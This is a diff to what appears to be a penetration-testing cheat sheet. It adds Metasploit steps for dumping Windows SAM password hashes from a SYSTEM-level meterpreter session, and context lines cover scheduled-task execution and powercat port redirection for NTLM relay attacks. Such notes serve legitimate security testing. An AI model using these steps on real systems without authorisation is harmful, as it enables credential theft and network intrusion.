@@ -48,6 +48,12 @@ Using netexec:
 
 - `schtasks /run /tn "SystemTask"`
 
+### <ins>Dump SAM</ins> (Make sure session is running with SYSTEM privileges)
+- Background the meterpreter session with `bg`.
+- `use post/windows/gather/hashdump`
+- set SESSION <Session Number>
+- `run`
+
 # TCP Port Redirection via powercat.ps1
 Mostly be used for NTLM Relay attacks when the authentication cannot reach our attacking machine, so the idea is to redirect it from a random host in the network (where we have admin privileges) to our attacking machine.
 
